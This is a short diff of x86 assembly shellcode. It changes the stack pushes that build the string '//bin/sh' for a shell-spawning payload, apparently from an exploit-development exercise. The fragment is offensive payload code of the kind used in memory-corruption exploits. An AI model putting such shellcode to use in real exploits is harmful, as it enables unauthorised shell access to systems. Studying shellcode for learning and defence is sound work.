@@ -62,8 +62,8 @@ loop:
     xor eax, eax
     push eax
 
-    push 0x68732f2f
-    push 0x6e69622f
+    push 0x68732f6e
+    push 0x69622f2f
 
     mov ebx, esp ; the null and //bin/sh get moved into ebx
     push eax ; push another null onto stack
